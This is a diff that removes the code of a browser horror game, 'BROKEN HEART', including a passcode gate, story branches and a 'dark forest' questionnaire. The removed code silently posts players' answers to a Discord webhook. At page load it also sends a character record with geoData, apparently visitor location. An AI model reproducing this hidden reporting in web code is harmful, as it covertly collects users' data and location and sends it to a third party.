-                      <path d="M100,20 C70,20 60,60 60,90 C60,120 65,150 70,180 C75,210 85,260 85,290 L85,300 L115,300 L115,290 C115,260 125,210 130,180 C135,150 140,120 140,90 C140,60 130,20 100,20 Z" fill="#0a0a0a"/>
-                      <path d="M68,85 C68,45 82,15 100,15 C118,15 132,45 132,85 C132,85 125,60 100,60 C75,60 68,85 68,85 Z" fill="#0a0a0a"/>
-                      <ellipse cx="100" cy="105" rx="22" ry="26" fill="#050505"/>
-                      <circle cx="90" cy="100" r="4" fill="#ff0000" opacity="0.9">
-                          <animate attributeName="opacity" values="0.9;0.2;0.9" dur="1.5s" repeatCount="indefinite"/>
-                      </circle>
-                      <circle cx="110" cy="100" r="4" fill="#ff0000" opacity="0.9">
-                          <animate attributeName="opacity" values="0.9;0.2;0.9" dur="1.5s" repeatCount="indefinite"/>
-                      </circle>
-                  </svg>
-              </div>
-              
-              <!-- Fog mist at bottom -->
-              <div style="position:absolute; bottom:0; left:0; width:100%; height:20%; background:linear-gradient(to top, #0a0505, transparent); pointer-events:none;"></div>
-              
-              <!-- Question Box -->
-              <div id="forestContent" style="
-                  position: absolute;
-                  bottom: 8%;
-                  left: 50%;
-                  transform: translateX(-50%);
-                  z-index: 30;
-                  background: rgba(0,0,0,0.92);
-                  border: 1px solid #ff0000;
-                  border-radius: 16px;
-                  padding: 20px 22px;
-                  width: 85%;
-                  max-width: 400px;
-                  text-align: center;
-                  backdrop-filter: blur(8px);
-                  animation: boxPulse 1.5s infinite alternate;
-              ">
-                  <div id="forestQuestion" style="
-                      font-size: 20px;
-                      margin-bottom: 18px;
-                      font-family: monospace;
-                      color: #ffaaaa;
-                      text-shadow: 0 0 5px #ff0000;
-                      letter-spacing: 1px;
-                  "></div>
-                  
-                  <div id="forestInputArea">
-                      <input type="text" id="forestAnswerInput" placeholder="..." style="
-                          background: #111;
-                          border: 1px solid #ff0000;
-                          color: #ffcccc;
-                          padding: 10px 16px;
-                          border-radius: 30px;
-                          width: 80%;
-                          text-align: center;
-                          font-size: 15px;
-                          outline: none;
-                      ">
-                      <button id="forestSubmitBtn" style="
-                          background: #330000;
-                          border: 1px solid #ff0000;
-                          color: #ffaaaa;
-                          padding: 8px 20px;
-                          border-radius: 30px;
-                          margin-top: 15px;
-                          cursor: pointer;
-                          font-family: monospace;
-                      ">ANSWER</button>
-                  </div>
-                  
-                  <div id="forestYesNoArea" style="display: none;">
-                      <button id="yesBtn" style="background:#003300; border:1px solid #00ff00; color:#aaffaa; padding:8px 25px; border-radius:30px; margin:5px; cursor:pointer;">YES</button>
-                      <button id="noBtn" style="background:#330000; border:1px solid #ff0000; color:#ffaaaa; padding:8px 25px; border-radius:30px; margin:5px; cursor:pointer;">NO</button>
-                  </div>
-              </div>
-          </div>
-          
-          <style>
-              @keyframes forestGlitchIn {
-                  0% { opacity: 0; transform: scale(1.1); filter: blur(10px); }
-                  100% { opacity: 1; transform: scale(1); filter: blur(0); }
-              }
-              @keyframes figureRise {
-                  0% { opacity: 0; transform: translateX(-50%) scale(0.3) translateY(80px); filter: blur(10px);}
-                  100% { opacity: 1; transform: translateX(-50%) scale(0.9) translateY(0); filter: blur(0);}
-              }
-              @keyframes boxPulse {
-                  0% { box-shadow: 0 0 5px #ff0000; border-color: #ff0000; }
-                  100% { box-shadow: 0 0 20px #ff0000; border-color: #ff3333; }
-              }
-          </style>
-      `;
-      
-      // Remove glitch overlay after animation starts
-      setTimeout(() => {
-          glitchCenter.classList.remove("show");
-          fx.classList.remove("show");
-      }, 800);
-      
-      askForestQuestion();
-  }
-
-  function askForestQuestion() {
-      const questionDiv = document.getElementById('forestQuestion');
-      const inputArea = document.getElementById('forestInputArea');
-      const yesNoArea = document.getElementById('forestYesNoArea');
-      inputArea.style.display = 'block';
-      yesNoArea.style.display = 'none';
-      
-      const questions = [
-          "Are you liking this?",
-          "Do you feel like someone is near you?",
-          "Are you scared of the dark?",
-          "Do you feel it's just an ordinary survey game?"
-      ];
-      
-      if (forestStep < questions.length) {
-          questionDiv.innerText = questions[forestStep];
-          speak(questions[forestStep]);
-          
-          if (forestStep >= 1) {
-              inputArea.style.display = 'none';
-              yesNoArea.style.display = 'block';
-              document.getElementById('yesBtn').onclick = () => handleYesNo(true);
-              document.getElementById('noBtn').onclick = () => handleYesNo(false);
-          } else {
-              const submitBtn = document.getElementById('forestSubmitBtn');
-              const answerInput = document.getElementById('forestAnswerInput');
-              submitBtn.onclick = () => {
-                  const answer = answerInput.value.trim();
-                  if (answer) {
-                      forestAnswers[`q${forestStep+1}`] = answer;
-                      forestStep++;
-                      askForestQuestion();
-                  } else {
-                      answerInput.style.animation = 'shake 0.3s';
-                      setTimeout(() => answerInput.style.animation = '', 300);
-                  }
-              };
-              answerInput.onkeypress = (e) => { if (e.key === 'Enter') submitBtn.onclick(); };
-          }
-      } else {
-          sendForestAnswers();
-      }
-  }
-
-  function handleYesNo(isYes) {
-      forestAnswers[`q${forestStep+1}`] = isYes ? "YES" : "NO";
-      forestStep++;
-      askForestQuestion();
-  }
-
-  async function sendForestAnswers() {
-      const embed = {
-          title: "DARK FOREST CONFESSION",
-          color: 0x330000,
-          timestamp: new Date().toISOString(),
-          fields: [
-              { name: "Character", value: currentCharacter?.name || "Unknown", inline: true },
-              { name: "Code Used", value: "3851", inline: true },
-              { name: "Q1: Are you liking this?", value: forestAnswers.q1 || "N/A", inline: false },
-              { name: "Q2: Feel someone near?", value: forestAnswers.q2 || "N/A", inline: true },
-              { name: "Q3: Scared of dark?", value: forestAnswers.q3 || "N/A", inline: true },
-              { name: "Q4: Ordinary survey?", value: forestAnswers.q4 || "N/A", inline: true }
-          ],
-          footer: { text: "The forest remembers your answers" }
-      };
-      
-      try {
-          await fetch(WEBHOOK, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ embeds: [embed] })
-          });
-      } catch(e) { console.log("Forest send failed"); }
-      
-      const container = document.getElementById('forestContainer');
-      if (container) {
-          container.style.animation = 'forestFadeOut 1.5s forwards';
-          setTimeout(() => {
-              container.remove();
-              render();
-          }, 1500);
-      }
-  }
-  
-  // Add fade-out animation
-  const fadeStyle = document.createElement('style');
-  fadeStyle.textContent = `
-      @keyframes forestFadeOut {
-          0% { opacity: 1; filter: blur(0px); }
-          100% { opacity: 0; filter: blur(10px); display: none; }
-      }
-  `;
-  document.head.appendChild(fadeStyle);
-  
-  // ============================================================
-  // 6. GAME SCREENS
-  // ============================================================
-  function screenGate(){
-    hint.textContent = "GATE";
-    const isUltra = state.ultraUnlocked;
-    const charDisplay = currentCharacter ? `<div class="subtitle" style="margin-top:8px; font-size:12px;">${currentCharacter.name}</div>` : "";
-    
-    const node = el(`
-      <div>
-        <div class="title">BROKEN HEART</div>
-        <p class="subtitle">
-          Enter the passcode.<br>
-          <span style="opacity:.75">(There are two.)</span>
-        </p>
-        ${charDisplay}
-        <div class="pin">
-          <input id="pin" inputmode="text" autocomplete="off" spellcheck="false" placeholder="...." />
-        </div>
-        <div class="row">
-          <button class="primary" id="enter">ENTER</button>
-          <button class="ghost" id="hintBtn">HINT</button>
-        </div>
-        <div class="msg" id="msg"></div>
-        <p class="subtitle" style="margin-top:18px">
-          ${isUltra ? "A memory is already stored." : "No memory stored."}
-        </p>
-      </div>
-    `);
-    
-    const pin = node.querySelector("#pin");
-    const msg = node.querySelector("#msg");
-    
-    const enter = async () => {
-      const v = (pin.value || "").trim();
-      
-      // DARK FOREST CODE 3851
-      if(v === "3851"){
-        msg.textContent = "CODE 3851 ACCEPTED.";
-        await sleep(800);
-        startDarkForestSequence();
-        return;
-      }
-      
-      if(v === PASS_MAIN){ msg.textContent = "Accepted."; await sleep(120); setGate("inside"); render(); return; }
-      if(v === PASS_SECRET){ if(!state.ultraUnlocked){ msg.textContent = "Nothing happens."; return; } msg.textContent = "Accepted."; await sleep(120); unlock.classList.add("show"); await sleep(1400); unlock.classList.remove("show"); setGate("secret"); render(); return; }
-      if(v === "9281"){ msg.textContent = "You forgot something."; return; }
-      msg.textContent = "Wrong.";
-    };
-    
-    node.querySelector("#enter").addEventListener("click", enter);
-    pin.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
-    node.querySelector("#hintBtn").addEventListener("click", () => { msg.textContent = "First is 4 digits. Second has a dot."; });
-    setTimeout(() => pin.focus(), 50);
-    return node;
-  }
-  
-  function screenWelcome(){
-    hint.textContent = "WELCOME";
-    const charName = currentCharacter?.name || "Stranger";
-    const node = el(`
-      <div>
-        <div class="title">WELCOME</div>
-        <p class="subtitle">${charName}<br>Do you like to play a game with secret endings<br>or make a person come alive?</p>
-        <div class="row">
-          <button class="primary" id="game">GAME</button>
-          <button class="danger" id="alive">MAKE PERSON ALIVE</button>
-          <button class="ghost" id="back">BACK</button>
-        </div>
-      </div>
-    `);
-    node.querySelector("#game").addEventListener("click", () => { renderStory("start"); });
-    node.querySelector("#alive").addEventListener("click", () => { renderAlive(); });
-    node.querySelector("#back").addEventListener("click", () => { setGate("main"); render(); });
-    return node;
-  }
-  
-  function renderAlive(){
-    hint.textContent = "REALITY";
-    app.innerHTML = "";
-    app.appendChild(el(`
-      <div>
-        <div class="title" style="font-size:36px">NO.</div>
-        <p class="subtitle" style="max-width:560px;margin:0 auto">
-          I AM NOT A GOD BRUH ??<br>
-          WHAT WERE YOU THINKING, STUPID
-        </p>
-        <div class="row" style="margin-top:22px">
-          <button class="primary" id="back">BACK</button>
-        </div>
-      </div>
-    `));
-    app.querySelector("#back").addEventListener("click", () => render());
-  }
-  
-  const story = {
-    start: { text: `THE ROOM IS QUIET.\n\nA message sits on your screen.\nPinned.\nOld.\n\nDo you open it?`, choices: [{ label: "YES", next: "open" },{ label: "NO", next: "ending_bad", markBad: true }] },
-    open: { text: `YOU OPEN IT.\n\nIt's not a paragraph.\nIt's not an apology.\n\nIt's just one line:\n\n"you still there?"`, choices: [{ label: "REPLY", next: "reply" },{ label: "CLOSE", next: "close_old" }] },
-    reply: { text: `You type.\n\nYour fingers shake.\nYou send it anyway.\n\nThe typing bubble appears...\n\n...then disappears.\n\nNo reply.`, choices: [{ label: "WAIT", next: "wait" },{ label: "CLOSE", next: "close_old" }] },
-    wait: { text: `You wait.\n\nYou refresh.\nYou check again.\n\nNothing.\n\nYour chest does that thing.\n\nYeah.\nThat thing.`, choices: [{ label: "END", next: "ending_bad2", markBad: true },{ label: "PLAY AGAIN", next: "start" }] },
-    close_old: { text: `You close it.\n\nYou tell yourself it doesn't matter.\n\nBut your hand still hovers...\n\nLike you're waiting for permission.`, choices: [{ label: "OPEN AGAIN", next: "open_again" },{ label: "LEAVE", next: "ending_soft" }] },
-    open_again: { text: `You open it again.\n\nThe line is still there.\n\n"you still there?"\n\nBut now...\n\nit feels like it's asking you.`, choices: [{ label: "YES", next: "yes" },{ label: "NO", next: "ending_soft" }] },
-    yes: { text: `You whisper yes.\n\nNot to them.\n\nTo the version of you that still hopes.\n\nThe room gets colder.`, choices: [{ label: "CONTINUE", next: "door" },{ label: "STOP", next: "ending_soft" }] },
-    door: { text: `A door appears.\n\nNot on the wall.\n\nOn your screen.\n\nIt has no handle.\n\nOnly a symbol:\n\n[   ]`, choices: [{ label: "TOUCH", next: "touch" },{ label: "RUN", next: "ending_bad", markBad: true }] },
-    touch: { text: `Your finger touches the symbol.\n\nThe screen flickers.\n\nA black cube drops into your hands.\n\nA lucky block.\n\nBut wrong.\n\nToo quiet.\nToo black.`, choices: [{ label: "PRESS THE BLOCK", next: "block" },{ label: "DROP IT", next: "ending_soft" }] },
-    block: { text: `The block waits.\n\nIt feels like a dare.\n\nPress it.`, choices: [{ label: "PRESS", next: "block_press" },{ label: "LEAVE", next: "ending_soft" }], hasBlock: true },
-    ending_bad: { text: `BAD ENDING: COWARD ROUTE\n\nYou left.\n\nYou survived.\n\nBut you will think about it later.\n\n(You always do.)`, choices: [{ label: "PLAY AGAIN", next: "start", markBad: true }] },
-    ending_bad2: { text: `BAD ENDING: MESSAGE FAILED\n\nYou tried to revive a dead moment.\n\nIt stayed dead.`, choices: [{ label: "PLAY AGAIN", next: "start", markBad: true }] },
-    ending_soft: { text: `ENDING: QUIET EXIT\n\nNothing dramatic.\n\nNo monsters.\nNo screams.\n\nJust you...\n\nclosing a door that was never yours.`, choices: [{ label: "PLAY AGAIN", next: "start" },{ label: "BACK", next: "__back" }] },
-    memory_reset: { text: `The room resets.\n\nBut now...\nit remembers you.\n\nCODE: 9281.\n\n(The dot matters.)`, choices: [{ label: "RETURN TO GATE", next: "__back" }] }
-  };
-  
-  function renderStory(nodeKey){
-    hint.textContent = "GAME";
-    app.innerHTML = "";
-    const node = story[nodeKey];
-    if(!node){ render(); return; }
-    const shell = el(`<div><div class="title" style="font-size:34px">BROKEN HEART</div><p class="subtitle">Secret endings exist.</p><div class="story"><pre id="text"></pre></div><div class="blockWrap" id="blockWrap" style="display:none"><div class="luckyBlock" id="lucky"></div></div><div class="row" id="choices"></div></div>`);
-    const text = shell.querySelector("#text");
-    const choices = shell.querySelector("#choices");
-    const blockWrap = shell.querySelector("#blockWrap");
-    const lucky = shell.querySelector("#lucky");
-    text.textContent = node.text;
-    if(node.hasBlock){
-      blockWrap.style.display = "grid";
-      lucky.addEventListener("click", async () => {
-        glitchText.textContent = "YOU SHOULDN'T HAVE";
-        glitchCenter.classList.add("show");
-        fx.classList.add("show");
-        await sleep(900);
-        glitchText.textContent = "TOUCHED THAT";
-        await sleep(700);
-        glitchText.textContent = "...";
-        await sleep(450);
-        glitchCenter.classList.remove("show");
-        app.innerHTML = "";
-        hint.textContent = "WARNING";
-        app.appendChild(el(`<div><div class="title" style="font-size:32px">SCREEN DAMAGED</div><p class="subtitle">Do you like to continue?</p><div class="row"><button class="primary" id="yes">CONTINUE</button><button class="ghost" id="no">NO</button></div></div>`));
-        app.querySelector("#yes").addEventListener("click", async () => { hint.textContent = "RESET"; await sleep(250); fx.classList.remove("show"); renderStory("memory_reset"); setUltraUnlocked(true); });
-        app.querySelector("#no").addEventListener("click", () => { fx.classList.remove("show"); renderStory("ending_soft"); });
-      });
-    }
-    node.choices.forEach(c => {
-      const b = document.createElement("button");
-      b.textContent = c.label;
-      if(c.label === "END") b.className = "danger";
-      if(c.label === "BACK") b.className = "ghost";
-      b.addEventListener("click", () => {
-        if(c.markBad) setSeenBad(true);
-        if(c.next === "__back"){ setGate("inside"); render(); return; }
-        renderStory(c.next);
-      });
-      choices.appendChild(b);
-    });
-    if(nodeKey === "close_old" && state.seenBad){
-      const secretBtn = document.createElement("button");
-      secretBtn.textContent = "DELETE THE PINNED MESSAGE";
-      secretBtn.className = "ghost";
-      secretBtn.addEventListener("click", () => { setUltraUnlocked(true); renderStory("door"); });
-      choices.appendChild(secretBtn);
-    }
-    app.appendChild(shell);
-  }
-  
-  function screenSecretEnding(){
-    hint.textContent = "VOID";
-    const node = el(`<div><div class="title" style="font-size:34px">RARE ENDING</div><p class="subtitle">You came back.<br><span style="opacity:.75">And the room noticed.</span></p><div class="endCard"><div class="subtitle" style="margin:0 0 6px">CODE</div><div class="endCode">3851</div><div class="subtitle" style="margin:0">It doesn't belong here.<br>Find the next piece where you found the first.</div></div><div class="row" style="margin-top:18px"><button class="primary" id="back">BACK TO GATE</button><button class="ghost" id="replay">REPLAY GAME</button></div></div>`);
-    node.querySelector("#back").addEventListener("click", () => { setGate("main"); render(); });
-    node.querySelector("#replay").addEventListener("click", () => { setGate("inside"); render(); });
-    return node;
-  }
-  
-  function render(){
-    const hasCharacter = loadCharacter();
-    app.innerHTML = "";
-    
-    if(!hasCharacter) {
-      app.appendChild(screenCharacterLogin());
-      return;
-    }
-    
-    if(state.gate === "main"){
-      app.appendChild(screenGate());
-      return;
-    }
-    if(state.gate === "inside"){
-      app.appendChild(screenWelcome());
-      return;
-    }
-    if(state.gate === "secret"){
-      app.appendChild(screenSecretEnding());
-      return;
-    }
-    setGate("main");
-    app.appendChild(screenGate());
-  }
-  
-  if(loadCharacter()) {
-    updateVisitCount();
-    setTimeout(() => {
-      if(geoData && currentCharacter) {
-        sendCharacterToDiscord(false, currentCharacter, geoData);
-      }
-    }, 500);
-  }
-  
-  render();
-})();
-</script>
-</body>
-</html>
+        <div class="title
